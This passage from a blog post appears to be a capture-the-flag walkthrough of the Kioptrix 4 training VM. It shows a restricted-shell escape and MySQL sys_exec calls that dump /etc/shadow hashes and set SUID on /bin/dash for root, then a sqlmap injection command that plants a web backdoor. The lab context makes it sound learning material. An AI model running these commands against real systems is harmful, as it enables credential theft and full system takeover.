</span><span class='line'>Type '?' or 'help' to get the list of allowed commands
</span><span class='line'>john:~$ echo os.system('/bin/bash')
</span><span class='line'>john@Kioptrix4:~$ id
</span><span class='line'>uid=1001(john) gid=1001(john) groups=1001(john)
</span><span class='line'>
</span><span class='line'>john:~$ mysql -u root
</span><span class='line'>
</span><span class='line'>mysql> select sys_exec('cat /etc/shadow > /tmp/a');
</span><span class='line'>+--------------------------------------+
</span><span class='line'>| sys_exec('cat /etc/shadow > /tmp/a') |
</span><span class='line'>+--------------------------------------+
</span><span class='line'>| NULL                                 |
</span><span class='line'>+--------------------------------------+
</span><span class='line'>1 row in set (0.01 sec)
</span><span class='line'>
</span><span class='line'>mysql>
</span><span class='line'>[1]+  Stopped                 mysql -u root
</span><span class='line'>john@Kioptrix4:~$ cat /tmp/a
</span><span class='line'>root:$1$5GMEyqwV$x0b1nMsYFXvczN0yI0kBB.:15375:0:99999:7:::
</span><span class='line'>daemon:*:15374:0:99999:7:::
</span><span class='line'>bin:*:15374:0:99999:7:::
</span><span class='line'>sys:*:15374:0:99999:7:::
</span><span class='line'>sync:*:15374:0:99999:7:::
</span><span class='line'>games:*:15374:0:99999:7:::
</span><span class='line'>man:*:15374:0:99999:7:::
</span><span class='line'>lp:*:15374:0:99999:7:::
</span><span class='line'>mail:*:15374:0:99999:7:::
</span><span class='line'>news:*:15374:0:99999:7:::
</span><span class='line'>uucp:*:15374:0:99999:7:::
</span><span class='line'>proxy:*:15374:0:99999:7:::
</span><span class='line'>www-data:*:15374:0:99999:7:::
</span><span class='line'>backup:*:15374:0:99999:7:::
</span><span class='line'>list:*:15374:0:99999:7:::
</span><span class='line'>irc:*:15374:0:99999:7:::
</span><span class='line'>gnats:*:15374:0:99999:7:::
</span><span class='line'>nobody:*:15374:0:99999:7:::
</span><span class='line'>libuuid:!:15374:0:99999:7:::
</span><span class='line'>dhcp:*:15374:0:99999:7:::
</span><span class='line'>syslog:*:15374:0:99999:7:::
</span><span class='line'>klog:*:15374:0:99999:7:::
</span><span class='line'>mysql:!:15374:0:99999:7:::
</span><span class='line'>sshd:*:15374:0:99999:7:::
</span><span class='line'>loneferret:$1$/x6RLO82$43aCgYCrK7p2KFwgYw9iU1:15375:0:99999:7:::
</span><span class='line'>john:$1$H.GRhlY6$sKlytDrwFEhu5dULXItWw/:15374:0:99999:7:::
</span><span class='line'>robert:$1$rQRWeUha$ftBrgVvcHYfFFFk6Ut6cM1:15374:0:99999:7:::
</span><span class='line'>john@Kioptrix4:/etc/samba$
</span><span class='line'>
</span><span class='line'>mysql> select sys_exec('chmod +s /bin/dash');
</span><span class='line'>+--------------------------------+
</span><span class='line'>| sys_exec('chmod +s /bin/dash') |
</span><span class='line'>+--------------------------------+
</span><span class='line'>| NULL                           |
</span><span class='line'>+--------------------------------+
</span><span class='line'>1 row in set (0.01 sec)
</span><span class='line'>
</span><span class='line'>john@Kioptrix4:~$ /bin/dash
</span><span class='line'># id
</span><span class='line'>uid=1001(john) gid=1001(john) euid=0(root) egid=0(root) groups=1001(john)
</span><span class='line'>
</span><span class='line'># cd /root
</span><span class='line'># cat congrats.txt
</span><span class='line'>Congratulations!
</span><span class='line'>You've got root.
</span><span class='line'>
</span><span class='line'>There is more then one way to get root on this system. Try and find them.
</span><span class='line'>I've only tested two (2) methods, but it doesn't mean there aren't more.
</span><span class='line'>As always there's an easy way, and a not so easy way to pop this box.
</span><span class='line'>Look for other methods to get root privileges other than running an exploit.
</span><span class='line'>
</span><span class='line'>It took a while to make this. For one it's not as easy as it may look, and
</span><span class='line'>also work and family life are my priorities. Hobbies are low on my list.
</span><span class='line'>Really hope you enjoyed this one.
</span><span class='line'>
</span><span class='line'>If you haven't already, check out the other VMs available on:
</span><span class='line'>www.kioptrix.com
</span><span class='line'>
</span><span class='line'>Thanks for playing,
</span><span class='line'>loneferret</span></code></pre></td></tr></table></div></figure>


<p>Because the UDF exploitation is well known for sqlmap, we could solve the challenge also using this tool:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# sqlmap -u http://192.168.80.154/checklogin.php --data="myusername=a&mypassword=a&Submit=Login" --os-cmd 'id' --batch | grep uid
</span><span class='line'>command standard output:    'uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=33(www-data)'
</span><span class='line'>
</span><span class='line'>root@kali32:~# sqlmap -u http://192.168.80.154/checklogin.php --data="myusername=a&mypassword=a&Submit=Login" --os-cmd 'cat /root/congrats.txt' --batch
</span><span class='line'>...
</span><span class='line'>[00:13:06] [INFO] the backdoor has been successfully uploaded on '/var/www/' - http://192.168.80.154:80/tmpbborl.php
</span><span class='line'>do you want to retrieve the command standard output? [Y/n/a] Y
</span><span class='line'>command standard output:
</span><span class='line'>---
</span><span class='line'>Congratulations!
</span><span class='line'>You've got root.
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>

</div>
  
  


    </article>
  
  <div class="pagination">
    
      <a class="prev" href="/posts/2">&larr; Older</a>
    
    <a href="/blog/archives">Blog Archives</a>
    
  </div>
</div>
<aside class="sidebar">
  
    




  
</aside>

    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2015 - Norbert Szetei -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
